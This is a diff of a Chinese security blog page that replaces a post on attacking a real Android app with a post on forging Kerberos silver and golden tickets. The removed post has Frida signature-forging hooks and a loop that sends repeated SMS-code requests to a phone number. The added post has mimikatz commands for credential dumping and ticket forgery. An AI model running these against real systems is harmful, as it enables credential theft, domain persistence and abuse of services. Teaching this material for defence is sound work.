@@ -4,12 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="一些真实的app渗透与算法hook, wa1ki0g,blog,github">
-    <meta name="description" content="app1apk文件下载到电脑，adb install 安装到真机上，打开是一个注册页面
-
-真机把SocksDroid打开，随便输个电话号，电脑开charles抓包：
-
-我们放到burp重发器里，改参数重发，不出意外，果然做了签名校验不让改包">
+    <meta name="keywords" content="白银票据与黄金票据构造分析, wa1ki0g,blog,github">
+    <meta name="description" content="大家最好在看这篇文章之前，去看下我写的那篇关于认证协议分析的文章：NTLM与kerberos认证体系详解
+（下面所说的Server hash指的是服务端机器用户的NTLM hash）我们的白银票据和黄金票据主要是用来做权限维持的
+白银票据白">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -21,7 +19,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>一些真实的app渗透与算法hook | wa1ki0g‘s blog</title>
+    <title>白银票据与黄金票据构造分析 | wa1ki0g‘s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -262,12 +260,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">一些真实的app渗透与算法hook</h1>
+                    <h1 class="description center-align post-title">白银票据与黄金票据构造分析</h1>
                 </div>
             </div>
         </div>
@@ -395,28 +393,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-09-25
+                    2022-12-30
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-09-25
+                    2022-10-29
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    619
+                    1.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    4 分
                 </div>
                 
 
@@ -431,90 +429,83 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h2><p>apk文件下载到电脑，adb install 安装到真机上，打开是一个注册页面</p>
-<p><img src="https://img-blog.csdnimg.cn/b90abb0a24e34fe49de4bb453977e318.png" alt="在这里插入图片描述"></p>
-<p>真机把SocksDroid打开，随便输个电话号，电脑开charles抓包：</p>
-<p><img src="https://img-blog.csdnimg.cn/893631dc91954b62a5ba243e9baa1e71.png" alt="在这里插入图片描述"></p>
-<p>我们放到burp重发器里，改参数重发，不出意外，果然做了签名校验不让改包：</p>
-<p><img src="https://img-blog.csdnimg.cn/f9390f59dbe040919f05247545021bd8.png" alt="在这里插入图片描述"><br>ok，逆一下这个apk，找到算法hook掉就好了，定位一下特征：</p>
-<p><img src="https://img-blog.csdnimg.cn/eb8ce964d9b949acad50ca6a7576f26a.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c5644413da8f4a608d70ec23bf6291db.png" alt="在这里插入图片描述"><br>这个函数是发送请求的一个函数，我们观察一下这段代码，可以看到我们最终发出去的sign参数的组成是：（时间 + 类型 + 未知字符 + 手机号），并且这个未知字符是这个函数的一个参数，那好办了。<br>直接hook这个getSmscode函数，看看传来了哪些值，就可以得到这个未知字符，有了这个未知字符我们就可以构建sign</p>
-<p>真机开下frida服务端，做一下端口转发：<br><img src="https://img-blog.csdnimg.cn/6ceb6cb1ac2c4209a4f2b9cb91322eca.png" alt="在这里插入图片描述"></p>
-<p>hook代码：</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> frida
-<span class="token keyword">import</span> sys
-<span class="token keyword">def</span> <span class="token function">on_message</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span>
-sess <span class="token operator">=</span> frida<span class="token punctuation">.</span>get_remote_device<span class="token punctuation">(</span><span class="token punctuation">)</span>
-nsess<span class="token operator">=</span>sess<span class="token punctuation">.</span>attach<span class="token punctuation">(</span><span class="token string">'app名字'</span><span class="token punctuation">)</span>
-<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'./bk.js'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
-    script <span class="token operator">=</span> nsess<span class="token punctuation">.</span>create_script<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-script<span class="token punctuation">.</span>on<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span>on_message<span class="token punctuation">)</span>
-script<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
-sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <p><strong>大家最好在看这篇文章之前，去看下我写的那篇关于认证协议分析的文章：<a target="_blank" rel="noopener" href="https://wa1ki0g.github.io/2021/12/27/NTLM%E4%B8%8Ekerberos%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB%E8%AF%A6%E8%A7%A3/">NTLM与kerberos认证体系详解</a></strong></p>
+<p><strong>（下面所说的Server hash指的是服务端机器用户的NTLM hash）</strong><br><strong>我们的白银票据和黄金票据主要是用来做权限维持的</strong></p>
+<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><p><strong>白银票据的特点：</strong></p>
+<ol>
+<li>不需要与DKC进行交互</li>
+<li>需要服务端的计算机机器账户ntlm hash</li>
+<li>只能针对一台机器</li>
+</ol>
+<p>在我们那个认证协议分析的文章中介绍了整个基于kerberos协议认证的流程，其中说到了ticket，而我们所说的白银票据其实就是我们伪造的ticket。</p>
+<p>在上一个文章中也讲了，ticket的构成：<br>ticket=Server hash（Server session key+Client info+End Time）</p>
+<p><img src="https://img-blog.csdnimg.cn/63e71b5d3d3e4662a01f7b52d94373ce.png"></p>
+<p>根据我们讲协议那篇文章可知，当客户端与服务端进程认证时，客户端会使用server session key来加密客户端的信息和时间戳，并连同ticket一同发给服务端，然后服务端会使用Server hash解密ticket，得到ticket里的end time，server session key等，所以在未发送Ticket 之前，服务端是不知道Server Session Key是什么的，所以我们只要知道Server hash就可以伪造一个不经过KDC认证的ticket，这也就是我们白银票据的原理。</p>
+<p>在构造的时候，我们可以自定义一个Server session key并使用它加密客户端的信息和时间戳并伪造一个ticket一同发送给服务端。</p>
+<p><strong>白银票据-mimikatz伪造演示</strong></p>
+<p>导出Server hash：</p>
+<pre class=" language-javascript"><code class="language-javascript">mimikatz<span class="token punctuation">.</span>exe <span class="token string">"privilege::debug"</span> <span class="token string">"sekurlsa::logonpasswords"</span> <span class="token string">"exit"</span> <span class="token operator">></span> log<span class="token punctuation">.</span>txt
 </code></pre>
-<pre class=" language-javascript"><code class="language-javascript">Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'com.jx885.library.http.CommAction'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getSmscode<span class="token punctuation">.</span>implementation<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span>aa<span class="token punctuation">,</span>bb<span class="token punctuation">,</span>cc<span class="token punctuation">)</span><span class="token punctuation">{</span>
-        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"hook success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"type："</span><span class="token operator">+</span>aa<span class="token punctuation">,</span><span class="token string">"key："</span><span class="token operator">+</span>bb<span class="token punctuation">,</span><span class="token string">"phone："</span><span class="token operator">+</span>cc<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getSmscode</span><span class="token punctuation">(</span>aa<span class="token punctuation">,</span>bb<span class="token punctuation">,</span>cc<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<p><img src="https://img-blog.csdnimg.cn/ed4efb39d4ae4e9d81a1037273b77fd9.png"></p>
+<p><strong>伪造票据：</strong></p>
+<p>在另外的机器上执行：</p>
+<pre class=" language-javascript"><code class="language-javascript">mimikatz<span class="token punctuation">.</span>exe <span class="token string">"kerberos::golden /domain:&lt;域名> /sid:&lt;域SID> /target:&lt;目标服务器主机名> /service:&lt;服务类型> /rc4:&lt;NTLM Hash> /user:&lt;用户名> /ptt"</span> exit
 </code></pre>
-<p>hook代码执行监听，手机重新发注册的包，成功监控到：<br><img src="https://img-blog.csdnimg.cn/10954ffaa97c4cb4b513b05c7b5c1868.png" alt="在这里插入图片描述"><br>未知字符找到了，我们用getStringMD5toUpperCase(yyyyMMddHHmmss + i + str + str2) 自己先算一组数据验证下，没有错误：</p>
-<p><img src="https://img-blog.csdnimg.cn/56aab381936e41a2841e6e76eef91eb6.png" alt="在这里插入图片描述"></p>
-<p>这回函数需要的参数我们都拥有了，我们直接通过frida的rpc来调用这个函数，直接给我们生成sign , 并简单写个发送请求的脚本，直接实现一条龙。<br>hook代码：</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> frida
-<span class="token keyword">import</span> time
-<span class="token keyword">import</span> datetime
-<span class="token keyword">import</span> requests
-url <span class="token operator">=</span> <span class="token string">'http://xxxxxx/Appapi/Common/getSmscode'</span>
-sess <span class="token operator">=</span> frida<span class="token punctuation">.</span>get_remote_device<span class="token punctuation">(</span><span class="token punctuation">)</span>
-nsess<span class="token operator">=</span>sess<span class="token punctuation">.</span>attach<span class="token punctuation">(</span><span class="token string">'app名字'</span><span class="token punctuation">)</span>
-phone <span class="token operator">=</span> <span class="token string">'15149029981'</span>
-type1 <span class="token operator">=</span> <span class="token string">'1'</span>
-
-<span class="token keyword">def</span> <span class="token function">on_message</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span>
-
-
-<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'./demo1.js'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
-    script <span class="token operator">=</span> nsess<span class="token punctuation">.</span>create_script<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-script<span class="token punctuation">.</span>on<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span>on_message<span class="token punctuation">)</span>
-script<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    curr_time <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    timestamp<span class="token operator">=</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>curr_time<span class="token punctuation">,</span><span class="token string">'%Y%m%d%H%M%S'</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">)</span>
-    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-    sign <span class="token operator">=</span> script<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>getsign<span class="token punctuation">(</span>f<span class="token string">'{timestamp}{type1}wocaonima{phone}'</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>sign<span class="token punctuation">)</span>
-    dd <span class="token operator">=</span> <span class="token string">'"phone":"{0}","sign":"{1}","currTime":"{2}","type":"1"'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>phone<span class="token punctuation">,</span>sign<span class="token punctuation">,</span>timestamp<span class="token punctuation">)</span>
-    nd <span class="token operator">=</span> <span class="token string">'{'</span><span class="token operator">+</span>dd<span class="token operator">+</span><span class="token string">'}'</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hook success:'</span><span class="token operator">+</span>nd<span class="token punctuation">)</span>
-    userjson<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'userjson'</span><span class="token punctuation">:</span>nd<span class="token punctuation">}</span>
-  
-    talk <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>userjson<span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"发送成功"</span><span class="token punctuation">)</span>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">/</span>domain：域名
+<span class="token operator">/</span>sid：SID值
+<span class="token operator">/</span>target<span class="token punctuation">:</span> 服务端计算机名
+<span class="token operator">/</span>service<span class="token punctuation">:</span> 需要指定相关的服务名
+<span class="token operator">/</span>rc4<span class="token punctuation">:</span> 服务端的计算机机器账户ntlm hash
+<span class="token operator">/</span>user<span class="token punctuation">:</span> 要伪造的用户名，任意填写
 </code></pre>
-<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">sign</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token keyword">var</span> res <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
-    Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        res <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'com.jx885.library.http.network.HttpUtils'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getStringMD5toUpperCase</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-    <span class="token punctuation">}</span><span class="token punctuation">)</span>
-    <span class="token keyword">return</span> res
-<span class="token punctuation">}</span>
-
-rpc<span class="token punctuation">.</span>exports<span class="token operator">=</span><span class="token punctuation">{</span>
-    getsign<span class="token punctuation">:</span>sign
-<span class="token punctuation">}</span><span class="token punctuation">;</span>
+<p><img src="https://img-blog.csdnimg.cn/7b6e6d70c67343b9b777d2e0b9e86b96.png"></p>
+<p><strong>成功：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/25db9614e8af489284aa4f5b129aef52.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/d6d3b39bfcf24b33bd4040b9ad94c3c9.png"></p>
+<p><strong>补充：</strong></p>
+<p>因为ticket 生成时指定了相关的服务名，所以因此只能用来访问相对应的服务。还有一些其他的服务：</p>
+<pre class=" language-javascript"><code class="language-javascript">服务名称                              同时需要的服务
+WMI                                  HOST、RPCSS
+PowerShell Remoting                  HOST、HTTP
+WinRM                                HOST、HTTP
+Scheduled Tasks                      HOST
+Windows File Share                   CIFS
+LDAP                                 LDAP
+Windows Remote Server                RPCSS、LDAP、CIFS
 </code></pre>
-<p><strong>第一个漏洞：验证码爆破</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/843a852697fc4eb287a0e1456b57f2f7.png" alt="在这里插入图片描述"></p>
-<p>结果：<br><img src="https://img-blog.csdnimg.cn/536b42d99f384d728859d4623a0cf542.png" alt="在这里插入图片描述"></p>
-<p><strong>第二个漏洞：任意用户密码重置</strong><br>结果<br><img src="https://img-blog.csdnimg.cn/395bd1b23d8d4504b1d0a09549309d6c.png" alt="在这里插入图片描述"></p>
-<p><strong>第三个漏洞：任意用户注册与手机绑定</strong><br>结果<br><img src="https://img-blog.csdnimg.cn/be1a0ae8f4a943d096a663a17e1f53b3.png" alt="在这里插入图片描述"></p>
-<p><strong>第四个漏洞：任意文件上传</strong><br>结果<br><img src="https://img-blog.csdnimg.cn/012f1a46ffce44da8523a2f9ceaa4bc2.png" alt="在这里插入图片描述"></p>
+<p><strong>白银票据防御</strong><br>开启PAC</p>
+<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p>黄金票据特点：</p>
+<ol>
+<li>需要与DC通信</li>
+<li>需要krbtgt用户的hash</li>
+</ol>
+<p>这里的krbtgt用户的hash指的就是之前协议那篇文章中讲的KDC Hash：</p>
+<p><img src="https://img-blog.csdnimg.cn/2f3a2eaa47514c6289c7d2bfcc251aae.png"></p>
+<p>黄金票据实际上指的就是我们伪造的那些TGT，在我们知道KDC Hash以后，就可以利用构造出来的TGT去申请各种服务的ticket，拿到ticket以后就可以访问目标服务器。</p>
+<p>我们在讲协议认证的那篇博客中，讲了TGT的构成：使用KDC hash 加密(session key ，客户端信息，客户端到期时间）后的密文</p>
+<p><img src="https://img-blog.csdnimg.cn/0bd884cec5234a419d474c72192bd404.png"></p>
+<ul>
+<li>在我们上篇文章讲到了，在获取ticket的时候，客户端会拿着得到的TGT以及用session key加密的当前客户端的一些信息和时间戳，然后还有一些客户端的信息和要访问的服务端的信息这三块内容去获取ticket。</li>
+<li>然后在服务端接受后它首先会使用KDC服务对应的用户的NTLM hash去解密TGT得到session key，再通过session key去解密客户端包装加密的信息，得到客户端的一些信息和时间戳，然后会比较这个时间戳和当前的时间戳是不是间隔的太久了，如果间隔超过一定时间则需要他重新从头开始验证，然后他还会通过接收到的这个客户端的信息和服务端的信息来判断当前客户端是否有权限去访问这个服务端。</li>
+</ul>
+<p><strong>所以黄金票据的原理就是伪造获取ticket时发送的TGT和用session key加密的密文等”，而这些在我们知道KDC Hash以后，是都可以完成的，通过DC的认证拿到ticket以后就可以访问目标服务器。（伪造的时候，session key 我们自己定义一串字符就好）</strong></p>
+<p><strong>伪造票据：</strong></p>
+<p>抓取域内hash：</p>
+<pre class=" language-javascript"><code class="language-javascript">域控执行：lsadump<span class="token punctuation">:</span><span class="token punctuation">:</span>lsa <span class="token operator">/</span>patch
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/ed7b51cda3944ead894c1dbfe0bcd7fb.png"></p>
+<p>在另外的机器上执行：</p>
+<pre class=" language-javascript"><code class="language-javascript">mimikatz<span class="token punctuation">.</span>exe <span class="token string">"kerberos::golden /domain:&lt;域名> /sid:&lt;域SID> /rc4:&lt;KRBTGT NTLM Hash> /user:&lt;用户名> /ptt"</span> exit
+</code></pre>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">/</span>domain：域名
+<span class="token operator">/</span>sid：SID值
+<span class="token operator">/</span>rc4<span class="token punctuation">:</span> 域控的krbtgt账户ntlm hash
+<span class="token operator">/</span>user<span class="token punctuation">:</span> 要伪造的用户名，任意填写
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/0f888a59d8cc43988a445ed4625fc2fe.png"></p>
+<p>成功：</p>
+<p><img src="https://img-blog.csdnimg.cn/1a1f491f804b4b35b6d67ac54e55b721.png"></p>
+<h2 id="ticket总结"><a href="#ticket总结" class="headerlink" title="ticket总结"></a>ticket总结</h2><p><img src="https://img-blog.csdnimg.cn/5454301f5610485c848676f651cde597.png"></p>
 
                 
             </div>
@@ -541,7 +532,7 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/09/25/%E4%B8%80%E4%BA%9B%E7%9C%9F%E5%AE%9E%E7%9A%84app%E6%B8%97%E9%80%8F%E4%B8%8E%E7%AE%97%E6%B3%95hook/">http://example.com/2022/09/25/%E4%B8%80%E4%BA%9B%E7%9C%9F%E5%AE%9E%E7%9A%84app%E6%B8%97%E9%80%8F%E4%B8%8E%E7%AE%97%E6%B3%95hook/</a>
+                    <a href="http://example.com/2022/12/30/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%B8%8E%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E6%9E%84%E9%80%A0%E5%88%86%E6%9E%90/">http://example.com/2022/12/30/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%B8%8E%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E6%9E%84%E9%80%A0%E5%88%86%E6%9E%90/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -748,9 +739,10 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/12/30/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%B8%8E%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E6%9E%84%E9%80%A0%E5%88%86%E6%9E%90/">
                     <div class="card-image">
@@ -768,9 +760,9 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-12-30
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-30
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -779,6 +771,7 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -789,13 +782,13 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/08/06/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94%E7%BB%95%E8%BF%87LSA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E6%80%BB%E7%BB%93/">
+                <a href="/2022/09/25/%E4%B8%80%E4%BA%9B%E7%9C%9F%E5%AE%9E%E7%9A%84app%E6%B8%97%E9%80%8F%E4%B8%8E%E7%AE%97%E6%B3%95hook/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="域渗透——绕过LSA保护机制总结">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="一些真实的app渗透与算法hook">
                         
-                        <span class="card-title">域渗透——绕过LSA保护机制总结</span>
+                        <span class="card-title">一些真实的app渗透与算法hook</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -806,7 +799,7 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-08-06
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-25
                             </span>
                         <span class="publish-author">
                             
